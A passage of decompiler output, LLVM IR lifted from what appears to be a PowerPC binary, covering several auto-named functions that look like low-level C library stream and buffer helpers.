  %v0_1000b4a8 = phi i32 [ %v3_1000b3fc, %dec_label_pc_1000b3f8 ], [ %v3_1000b434.pre, %dec_label_pc_1000b410 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b438 = icmp eq i32 %v0_1000b4a8, 1
  br i1 %v3_1000b438, label %dec_label_pc_1000b478.lr.ph, label %dec_label_pc_1000b4a8

dec_label_pc_1000b478.lr.ph:                      ; preds = %dec_label_pc_1000b430
  %v2_1000b444 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_100104d0.319, align 4
  store i32 ptrtoint (i32* @global_var_1000b458.321 to i32), i32* @lr, align 4
  %v3_1000b454 = call i32 @function_10006e28(i32 %v2_1000b444, i32 0, i32 140)
  store i32 %v2_1000b3b0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000b3c834, i32* %r9.global-to-local, align 4
  %v2_1000b48026 = add i32 %v2_1000b3b0, 256
  %v3_1000b48027 = inttoptr i32 %v2_1000b48026 to i32*
  store i32 -1, i32* %v3_1000b48027, align 4
  %v0_1000b48428 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b48429 = add i32 %v0_1000b48428, -1
  store i32 %v1_1000b48429, i32* %r11.global-to-local, align 4
  %v0_1000b48830 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b48831 = add i32 %v0_1000b48830, -1
  store i32 %v1_1000b48831, i32* %ctr.global-to-local, align 4
  %v2_1000b48832 = icmp eq i32 %v1_1000b48831, 0
  br i1 %v2_1000b48832, label %dec_label_pc_1000b48c, label %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge

dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge: ; preds = %dec_label_pc_1000b478.lr.ph, %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge
  %v1_1000b48433 = phi i32 [ %v1_1000b484, %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge ], [ %v1_1000b48429, %dec_label_pc_1000b478.lr.ph ]
  %v1_1000b47c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000b480.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b478 = mul i32 %v1_1000b48433, 4
  %v2_1000b47c = add i32 %v1_1000b478, %v1_1000b47c.pre
  store i32 %v2_1000b47c, i32* %r9.global-to-local, align 4
  %v2_1000b480 = add i32 %v2_1000b47c, 132
  %v3_1000b480 = inttoptr i32 %v2_1000b480 to i32*
  store i32 %v0_1000b480.pre, i32* %v3_1000b480, align 4
  %v0_1000b484 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b484 = add i32 %v0_1000b484, -1
  store i32 %v1_1000b484, i32* %r11.global-to-local, align 4
  %v0_1000b488 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b488 = add i32 %v0_1000b488, -1
  store i32 %v1_1000b488, i32* %ctr.global-to-local, align 4
  %v2_1000b488 = icmp eq i32 %v1_1000b488, 0
  br i1 %v2_1000b488, label %dec_label_pc_1000b48c, label %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge

dec_label_pc_1000b48c:                            ; preds = %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge, %dec_label_pc_1000b478.lr.ph
  store i32 268481700, i32* @lr, align 4
  %v4_1000b4a0 = call i32 @function_1000b254(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000b410

dec_label_pc_1000b4a8:                            ; preds = %dec_label_pc_1000b430
  %v3_1000b4a8 = icmp eq i32 %v0_1000b4a8, 2
  br i1 %v3_1000b4a8, label %dec_label_pc_1000b4b0, label %dec_label_pc_1000b4bc

dec_label_pc_1000b4b0:                            ; preds = %dec_label_pc_1000b4a8
  store i32 3, i32* @global_var_100104d0.319, align 4
  br label %dec_label_pc_1000b4bc

dec_label_pc_1000b4bc:                            ; preds = %dec_label_pc_1000b4a8, %dec_label_pc_1000b4b0
  %v3_1000b4bc = phi i32 [ %v0_1000b4a8, %dec_label_pc_1000b4a8 ], [ 3, %dec_label_pc_1000b4b0 ]
  %v1_1000b4c4 = icmp ne i32 %v3_1000b4bc, 3
  call void @__pseudo_cond_branch(i1 %v1_1000b4c4, i32 268481752)
  store i32 4, i32* @global_var_100104d0.319, align 4
  %v1_1000b4d4 = call i32 @function_10009114(i32 127)
  ret i32 %v1_1000b4d4

; uselistorder directives
  uselistorder i32 %v1_1000b488, { 1, 0 }
  uselistorder i32 %v1_1000b484, { 1, 0 }
  uselistorder i32 %v1_1000b3d0, { 1, 0 }
  uselistorder i32 %v1_1000b3cc, { 0, 2, 1 }
  uselistorder i32 %v2_1000b3b0, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 2, 4, 5, 9, 8, 3, 0, 1 }
  uselistorder i32 (i32)* @function_10009114, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_1000b254, { 1, 0 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_100104d0.319, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_10009488, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000b340, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b478.dec_label_pc_1000b478_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b430, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3c4.dec_label_pc_1000b3c4_crit_edge, { 1, 0 }
}

define i32 @function_1000b4e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b4e0:
  %v1_1000b4e0 = add i32 %arg1, 28
  %v2_1000b4e0 = inttoptr i32 %v1_1000b4e0 to i32*
  %v3_1000b4e0 = load i32, i32* %v2_1000b4e0, align 4
  store i32 %v3_1000b4e0, i32* @global_var_100104d4.322, align 4
  %v1_1000b4f0 = add i32 %arg1, 44
  %v2_1000b4f0 = inttoptr i32 %v1_1000b4f0 to i32*
  %v3_1000b4f0 = load i32, i32* %v2_1000b4f0, align 4
  store i32 %v3_1000b4f0, i32* @global_var_100104d8.323, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000b4fc() local_unnamed_addr {
dec_label_pc_1000b4fc:
  %v0_1000b508 = load i32, i32* @r3, align 4
  store i32 %v0_1000b508, i32* @r29, align 4
  %v0_1000b510 = call i32 @function_10004b48()
  %v0_1000b514 = load i32, i32* @r29, align 4
  %v2_1000b514 = inttoptr i32 %v0_1000b510 to i32*
  store i32 %v0_1000b514, i32* %v2_1000b514, align 4
  ret i32 -1
}

define i32 @function_1000b530(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b530:
  store i32 %arg1, i32* @global_var_100104dc.285, align 4
  %v0_1000b558 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000b558)
  store i32 12, i32* @r3, align 4
  %v0_1000b560 = call i32 @function_1000b4fc()
  ret i32 %v0_1000b560

; uselistorder directives
  uselistorder i32 ()* @function_1000b4fc, { 1, 0 }
  uselistorder i32* @global_var_100104dc.285, { 1, 0, 2 }
}

define i32 @function_1000b564() local_unnamed_addr {
dec_label_pc_1000b564:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b57c = call i32 @__asm_mfcr()
  %v1_1000b580 = and i32 %v0_1000b57c, 268435456
  %v3_1000b580 = icmp eq i32 %v1_1000b580, 0
  store i32 %v0_1000b57c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b580, label %dec_label_pc_1000b598, label %dec_label_pc_1000b58c

dec_label_pc_1000b58c:                            ; preds = %dec_label_pc_1000b564
  %v0_1000b58c = call i32 @function_10004b48()
  %v0_1000b590 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b590 = inttoptr i32 %v0_1000b58c to i32*
  store i32 %v0_1000b590, i32* %v2_1000b590, align 4
  br label %dec_label_pc_1000b598

dec_label_pc_1000b598:                            ; preds = %dec_label_pc_1000b564, %dec_label_pc_1000b58c
  %v0_1000b5a8 = phi i32 [ %v0_1000b57c, %dec_label_pc_1000b564 ], [ -1, %dec_label_pc_1000b58c ]
  ret i32 %v0_1000b5a8

; uselistorder directives
  uselistorder label %dec_label_pc_1000b598, { 1, 0 }
}

define i32 @function_1000b5ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b5ac:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b5c4 = call i32 @__asm_mfcr()
  %v1_1000b5c8 = and i32 %v0_1000b5c4, 268435456
  %v3_1000b5c8 = icmp eq i32 %v1_1000b5c8, 0
  store i32 %v0_1000b5c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b5c8, label %dec_label_pc_1000b5e0, label %dec_label_pc_1000b5d4

dec_label_pc_1000b5d4:                            ; preds = %dec_label_pc_1000b5ac
  %v0_1000b5d4 = call i32 @function_10004b48()
  %v0_1000b5d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b5d8 = inttoptr i32 %v0_1000b5d4 to i32*
  store i32 %v0_1000b5d8, i32* %v2_1000b5d8, align 4
  br label %dec_label_pc_1000b5e0

dec_label_pc_1000b5e0:                            ; preds = %dec_label_pc_1000b5ac, %dec_label_pc_1000b5d4
  %v0_1000b5f0 = phi i32 [ %v0_1000b5c4, %dec_label_pc_1000b5ac ], [ -1, %dec_label_pc_1000b5d4 ]
  ret i32 %v0_1000b5f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000b5e0, { 1, 0 }
}

define i32 @function_1000b5f4(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000b5f4:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000b5f4 = load i32, i32* @r5, align 4
  %v0_1000b5f8 = load i32, i32* @r4, align 4
  %tmp10 = icmp slt i32 %v0_1000b5f8, 0
  %v1_1000b5fc = zext i1 %tmp10 to i32
  %v2_1000b5fc = ashr i32 %v0_1000b5f8, 31
  %v3_1000b5fc = and i32 %v2_1000b5fc, -2
  %v4_1000b5fc = or i32 %v3_1000b5fc, %v1_1000b5fc
  %v0_1000b608 = load i32, i32* @lr, align 4
  store i32 %v0_1000b608, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b5f4, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v4_1000b5fc, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000b5f4, 3
  br i1 %tmp9, label %dec_label_pc_1000b640, label %dec_label_pc_1000b62c

dec_label_pc_1000b62c:                            ; preds = %dec_label_pc_1000b5f4
  %v0_1000b62c = call i32 @function_10004b48()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b638 = inttoptr i32 %v0_1000b62c to i32*
  store i32 22, i32* %v2_1000b638, align 4
  br label %dec_label_pc_1000b708

dec_label_pc_1000b640:                            ; preds = %dec_label_pc_1000b5f4
  %v2_1000b640 = add i32 %tmp, 52
  %v3_1000b640 = inttoptr i32 %v2_1000b640 to i32*
  %v4_1000b640 = load i32, i32* %v3_1000b640, align 4
  store i32 %v4_1000b640, i32* @r28, align 4
  %v3_1000b644 = icmp eq i32 %v4_1000b640, 0
  br i1 %v3_1000b644, label %dec_label_pc_1000b64c, label %dec_label_pc_1000b66c

dec_label_pc_1000b64c:                            ; preds = %dec_label_pc_1000b640
  %v2_1000b64c = add i32 %tmp, 56
  store i32 %v2_1000b64c, i32* @r29, align 4
  %v2_1000b654 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b654, i32* @r3, align 4
  %v0_1000b660 = call i32 @function_10008c84()
  %v0_1000b668 = call i32 @function_10008c7c()
  %v0_1000b66c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b66c

dec_label_pc_1000b66c:                            ; preds = %dec_label_pc_1000b640, %dec_label_pc_1000b64c
  %v0_1000b678 = phi i32 [ %tmp, %dec_label_pc_1000b640 ], [ %v0_1000b66c.pre, %dec_label_pc_1000b64c ]
  %v1_1000b66c = inttoptr i32 %v0_1000b678 to i16*
  %v2_1000b66c = load i16, i16* %v1_1000b66c, align 2
  %v3_1000b66c = zext i16 %v2_1000b66c to i32
  store i32 %v3_1000b66c, i32* %r0.global-to-local, align 4
  %v1_1000b670 = and i32 %v3_1000b66c, 64
  store i32 %v1_1000b670, i32* %r9.global-to-local, align 4
  %v3_1000b670 = icmp eq i32 %v1_1000b670, 0
  br i1 %v3_1000b670, label %dec_label_pc_1000b688, label %dec_label_pc_1000b678

dec_label_pc_1000b678:                            ; preds = %dec_label_pc_1000b66c
  store i32 %v0_1000b678, i32* @r3, align 4
  store i32 268482176, i32* @lr, align 4
  %v0_1000b67c = call i32 @function_10005544()
  %v3_1000b680 = icmp eq i32 %v0_1000b67c, 0
  br i1 %v3_1000b680, label %dec_label_pc_1000b688, label %dec_label_pc_1000b6f0

dec_label_pc_1000b688:                            ; preds = %dec_label_pc_1000b678, %dec_label_pc_1000b66c
  %v0_1000b688 = load i32, i32* @r30, align 4
  %v3_1000b688 = icmp eq i32 %v0_1000b688, 1
  br i1 %v3_1000b688, label %dec_label_pc_1000b690, label %dec_label_pc_1000b688.dec_label_pc_1000b6a4_crit_edge

dec_label_pc_1000b688.dec_label_pc_1000b6a4_crit_edge: ; preds = %dec_label_pc_1000b688
  br label %dec_label_pc_1000b6a4

dec_label_pc_1000b690:                            ; preds = %dec_label_pc_1000b688
  %v0_1000b690 = load i32, i32* @r31, align 4
  %v1_1000b690 = inttoptr i32 %v0_1000b690 to i16*
  %v2_1000b694 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268482204, i32* @lr, align 4
  %v4_1000b698 = call i32 @function_1000b794(i16* %v1_1000b690, i32 %v2_1000b694)
  %v1_1000b69c = icmp slt i32 %v4_1000b698, 0
  br i1 %v1_1000b69c, label %dec_label_pc_1000b6f0, label %dec_label_pc_1000b690.dec_label_pc_1000b6a4_crit_edge

dec_label_pc_1000b690.dec_label_pc_1000b6a4_crit_edge: ; preds = %dec_label_pc_1000b690
  %v0_1000b6a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000b6a4

dec_label_pc_1000b6a4:                            ; preds = %dec_label_pc_1000b688.dec_label_pc_1000b6a4_crit_edge, %dec_label_pc_1000b690.dec_label_pc_1000b6a4_crit_edge
  %v0_1000b6a4 = phi i32 [ %v0_1000b688, %dec_label_pc_1000b688.dec_label_pc_1000b6a4_crit_edge ], [ %v0_1000b6a4.pre, %dec_label_pc_1000b690.dec_label_pc_1000b6a4_crit_edge ]
  %v0_1000b6a8 = load i32, i32* @r31, align 4
  store i32 268482228, i32* @lr, align 4
  %v5_1000b6b0 = call i32 @function_1000b97c(i32 %v0_1000b6a8, i32* nonnull %stack_var_-56, i32 %v0_1000b6a4)
  %v1_1000b6b4 = icmp slt i32 %v5_1000b6b0, 0
  br i1 %v1_1000b6b4, label %dec_label_pc_1000b6f0, label %dec_label_pc_1000b6bc

dec_label_pc_1000b6bc:                            ; preds = %dec_label_pc_1000b6a4
  %v0_1000b6bc = load i32, i32* @r31, align 4
  %v1_1000b6bc = inttoptr i32 %v0_1000b6bc to i16*
  %v2_1000b6bc = load i16, i16* %v1_1000b6bc, align 2
  %v3_1000b6bc = zext i16 %v2_1000b6bc to i32
  store i32 %v3_1000b6bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000b6c4 = add i32 %v0_1000b6bc, 8
  %v2_1000b6c4 = inttoptr i32 %v1_1000b6c4 to i32*
  %v3_1000b6c4 = load i32, i32* %v2_1000b6c4, align 4
  store i32 %v3_1000b6c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000b6cc = and i32 %v3_1000b6bc, 65464
  store i32 %v1_1000b6cc, i32* %r0.global-to-local, align 4
  %v3_1000b6d0 = add i32 %v0_1000b6bc, 2
  %v4_1000b6d0 = inttoptr i32 %v3_1000b6d0 to i8*
  store i8 0, i8* %v4_1000b6d0, align 1
  %v0_1000b6d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6d4 = load i32, i32* @r31, align 4
  %v2_1000b6d4 = add i32 %v1_1000b6d4, 28
  %v3_1000b6d4 = inttoptr i32 %v2_1000b6d4 to i32*
  store i32 %v0_1000b6d4, i32* %v3_1000b6d4, align 4
  %v0_1000b6d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b6d8 = trunc i32 %v0_1000b6d8 to i16
  %v2_1000b6d8 = load i32, i32* @r31, align 4
  %v3_1000b6d8 = inttoptr i32 %v2_1000b6d8 to i16*
  store i16 %v1_1000b6d8, i16* %v3_1000b6d8, align 2
  %v0_1000b6dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6dc = load i32, i32* @r31, align 4
  %v2_1000b6dc = add i32 %v1_1000b6dc, 16
  %v3_1000b6dc = inttoptr i32 %v2_1000b6dc to i32*
  store i32 %v0_1000b6dc, i32* %v3_1000b6dc, align 4
  %v0_1000b6e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6e0 = load i32, i32* @r31, align 4
  %v2_1000b6e0 = add i32 %v1_1000b6e0, 20
  %v3_1000b6e0 = inttoptr i32 %v2_1000b6e0 to i32*
  store i32 %v0_1000b6e0, i32* %v3_1000b6e0, align 4
  %v0_1000b6e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6e4 = load i32, i32* @r31, align 4
  %v2_1000b6e4 = add i32 %v1_1000b6e4, 24
  %v3_1000b6e4 = inttoptr i32 %v2_1000b6e4 to i32*
  store i32 %v0_1000b6e4, i32* %v3_1000b6e4, align 4
  %v0_1000b6e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b6e8 = load i32, i32* @r31, align 4
  %v2_1000b6e8 = add i32 %v1_1000b6e8, 44
  %v3_1000b6e8 = inttoptr i32 %v2_1000b6e8 to i32*
  store i32 %v0_1000b6e8, i32* %v3_1000b6e8, align 4
  br label %dec_label_pc_1000b6f4

dec_label_pc_1000b6f0:                            ; preds = %dec_label_pc_1000b678, %dec_label_pc_1000b6a4, %dec_label_pc_1000b690
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000b6f4

dec_label_pc_1000b6f4:                            ; preds = %dec_label_pc_1000b6bc, %dec_label_pc_1000b6f0
  %v0_1000b6f4 = load i32, i32* @r28, align 4
  %v3_1000b6f4 = icmp eq i32 %v0_1000b6f4, 0
  br i1 %v3_1000b6f4, label %dec_label_pc_1000b6fc, label %dec_label_pc_1000b708

dec_label_pc_1000b6fc:                            ; preds = %dec_label_pc_1000b6f4
  %v2_1000b6fc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b6fc, i32* @r3, align 4
  %v0_1000b704 = call i32 @function_10008c84()
  br label %dec_label_pc_1000b708

dec_label_pc_1000b708:                            ; preds = %dec_label_pc_1000b6f4, %dec_label_pc_1000b62c, %dec_label_pc_1000b6fc
  store i32 %v0_1000b608, i32* %r0.global-to-local, align 4
  %v0_1000b70c = load i32, i32* @r30, align 4
  ret i32 %v0_1000b70c

; uselistorder directives
  uselistorder i32 %v0_1000b5f8, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @function_10008c7c, { 6, 4, 3, 2, 38, 37, 36, 35, 34, 33, 0, 39, 31, 30, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 32, 29, 28, 27, 26, 25, 5, 24, 43, 1, 23, 22, 42, 41, 40, 21, 20, 19 }
  uselistorder i32 ()* @function_10008c84, { 5, 4, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 1, 0, 49, 48, 33, 32, 31, 30, 7, 6, 35, 34, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 3, 2, 19, 18, 57, 56, 17, 16, 15, 14, 55, 54, 53, 52, 51, 50, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 56, { 3, 5, 1, 4, 0, 2 }
  uselistorder i32 52, { 8, 9, 11, 2, 5, 1, 10, 6, 7, 0, 3, 4 }
  uselistorder i32 22, { 0, 13, 1, 9, 2, 10, 11, 3, 15, 4, 14, 5, 6, 12, 7, 8 }
  uselistorder label %dec_label_pc_1000b708, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b6a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b66c, { 1, 0 }
}

define i32 @function_1000b720(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b720:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000b72c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b738 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b740 = and i16 %v3_1000b738, 4
  %v3_1000b740 = icmp eq i16 %v1_1000b740, 0
  br i1 %v3_1000b740, label %dec_label_pc_1000b748, label %dec_label_pc_1000b780

dec_label_pc_1000b748:                            ; preds = %dec_label_pc_1000b720
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000b754, label %dec_label_pc_1000b74c

dec_label_pc_1000b74c:                            ; preds = %dec_label_pc_1000b748
  br label %dec_label_pc_1000b754

dec_label_pc_1000b754:                            ; preds = %dec_label_pc_1000b748, %dec_label_pc_1000b74c
  %v1_1000b754 = add i32 %tmp, 4
  %v2_1000b754 = inttoptr i32 %v1_1000b754 to i32*
  %v3_1000b754 = load i32, i32* %v2_1000b754, align 4
  store i32 %v3_1000b754, i32* %r3.global-to-local, align 4
  store i32 268482396, i32* @lr, align 4
  %v1_1000b758 = call i32 @function_1000ca64(i32 %v3_1000b754)
  store i32 %v1_1000b758, i32* %r3.global-to-local, align 4
  %v2_1000b75c = icmp sgt i32 %v1_1000b758, 0
  br i1 %v2_1000b75c, label %dec_label_pc_1000b780, label %dec_label_pc_1000b764

dec_label_pc_1000b764:                            ; preds = %dec_label_pc_1000b754
  %v3_1000b75c = icmp eq i32 %v1_1000b758, 0
  %v0_1000b764 = load i32, i32* @r31, align 4
  %v1_1000b764 = inttoptr i32 %v0_1000b764 to i16*
  %v2_1000b764 = load i16, i16* %v1_1000b764, align 2
  br i1 %v3_1000b75c, label %dec_label_pc_1000b76c, label %dec_label_pc_1000b774

dec_label_pc_1000b76c:                            ; preds = %dec_label_pc_1000b764
  %v1_1000b76c = or i16 %v2_1000b764, 4
  br label %dec_label_pc_1000b77c

dec_label_pc_1000b774:                            ; preds = %dec_label_pc_1000b764
  %v1_1000b774 = or i16 %v2_1000b764, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b77c

dec_label_pc_1000b77c:                            ; preds = %dec_label_pc_1000b76c, %dec_label_pc_1000b774
  %v1_1000b76c.sink.off0 = phi i16 [ %v1_1000b76c, %dec_label_pc_1000b76c ], [ %v1_1000b774, %dec_label_pc_1000b774 ]
  store i16 %v1_1000b76c.sink.off0, i16* %v1_1000b764, align 2
  %v0_1000b790.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b780

dec_label_pc_1000b780:                            ; preds = %dec_label_pc_1000b720, %dec_label_pc_1000b754, %dec_label_pc_1000b77c
  %v0_1000b790 = phi i32 [ 0, %dec_label_pc_1000b720 ], [ %v1_1000b758, %dec_label_pc_1000b754 ], [ %v0_1000b790.pre, %dec_label_pc_1000b77c ]
  store i32 %v0_1000b72c, i32* @r31, align 4
  ret i32 %v0_1000b790

; uselistorder directives
  uselistorder i16 %v2_1000b764, { 1, 0 }
  uselistorder i32 %v1_1000b758, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000b780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b77c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b754, { 1, 0 }
}

define i32 @function_1000b794(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b794:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000b7ac = load i16, i16* %arg1, align 2
  %v4_1000b7ac = zext i16 %v3_1000b7ac to i32
  %tmp9 = urem i16 %v3_1000b7ac, 4
  %v3_1000b7b0 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000b7b0, label %dec_label_pc_1000b7fc, label %dec_label_pc_1000b7b8

dec_label_pc_1000b7b8:                            ; preds = %dec_label_pc_1000b794
  %v1_1000b7b0 = zext i16 %tmp9 to i32
  %v1_1000b7b8 = add nsw i32 %v1_1000b7b0, -1
  store i32 %v1_1000b7b8, i32* %r10.global-to-local, align 4
  %v4_1000b7b8 = icmp eq i32 %v1_1000b7b8, 0
  br i1 %v4_1000b7b8, label %dec_label_pc_1000b7fc, label %dec_label_pc_1000b7c0

dec_label_pc_1000b7c0:                            ; preds = %dec_label_pc_1000b7b8
  %v1_1000b7c0 = and i32 %v4_1000b7ac, 2048
  %v3_1000b7c0 = icmp eq i32 %v1_1000b7c0, 0
  br i1 %v3_1000b7c0, label %dec_label_pc_1000b7fc, label %dec_label_pc_1000b7c8

dec_label_pc_1000b7c8:                            ; preds = %dec_label_pc_1000b7c0
  %v2_1000b7c8 = icmp sgt i32 %v1_1000b7b8, 1
  br i1 %v2_1000b7c8, label %dec_label_pc_1000b874, label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %dec_label_pc_1000b7c8
  %v2_1000b7d0 = add i32 %tmp, 40
  %v3_1000b7d0 = inttoptr i32 %v2_1000b7d0 to i32*
  %v4_1000b7d0 = load i32, i32* %v3_1000b7d0, align 4
  %v3_1000b7d4 = icmp eq i32 %v4_1000b7d0, 0
  br i1 %v3_1000b7d4, label %dec_label_pc_1000b7dc, label %dec_label_pc_1000b874

dec_label_pc_1000b7dc:                            ; preds = %dec_label_pc_1000b7d0
  %v2_1000b7dc = add i32 %tmp, 44
  %v3_1000b7dc = inttoptr i32 %v2_1000b7dc to i32*
  %v4_1000b7dc = load i32, i32* %v3_1000b7dc, align 4
  %v2_1000b7e0 = add i32 %tmp, 3
  %v3_1000b7e0 = inttoptr i32 %v2_1000b7e0 to i8*
  %v4_1000b7e0 = load i8, i8* %v3_1000b7e0, align 1
  %v5_1000b7e0 = zext i8 %v4_1000b7e0 to i32
  %v2_1000b7e8 = sub nsw i32 %v1_1000b7b8, %v5_1000b7e0
  %v1_1000b7ec = add nsw i32 %v2_1000b7e8, -1
  store i32 %v1_1000b7ec, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000b7dc, 1
  br i1 %tmp7, label %dec_label_pc_1000b7fc, label %dec_label_pc_1000b7f4

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7dc
  %v2_1000b7f4 = add i32 %tmp, 2
  %v3_1000b7f4 = inttoptr i32 %v2_1000b7f4 to i8*
  %v4_1000b7f4 = load i8, i8* %v3_1000b7f4, align 1
  %v5_1000b7f4 = zext i8 %v4_1000b7f4 to i32
  %v2_1000b7f8 = sub nsw i32 %v1_1000b7ec, %v5_1000b7f4
  store i32 %v2_1000b7f8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b7fc

dec_label_pc_1000b7fc:                            ; preds = %dec_label_pc_1000b7dc, %dec_label_pc_1000b7c0, %dec_label_pc_1000b7b8, %dec_label_pc_1000b794, %dec_label_pc_1000b7f4
  %v0_1000b820 = phi i32 [ %v1_1000b7ec, %dec_label_pc_1000b7dc ], [ %v1_1000b7b8, %dec_label_pc_1000b7c0 ], [ 0, %dec_label_pc_1000b7b8 ], [ 0, %dec_label_pc_1000b794 ], [ %v2_1000b7f8, %dec_label_pc_1000b7f4 ]
  %v1_1000b7fc = and i32 %v4_1000b7ac, 64
  %v3_1000b7fc = icmp eq i32 %v1_1000b7fc, 0
  %storemerge.in.in.v = select i1 %v3_1000b7fc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000b810 = add i32 %tmp, 16
  %v3_1000b810 = inttoptr i32 %v2_1000b810 to i32*
  %v4_1000b810 = load i32, i32* %v3_1000b810, align 4
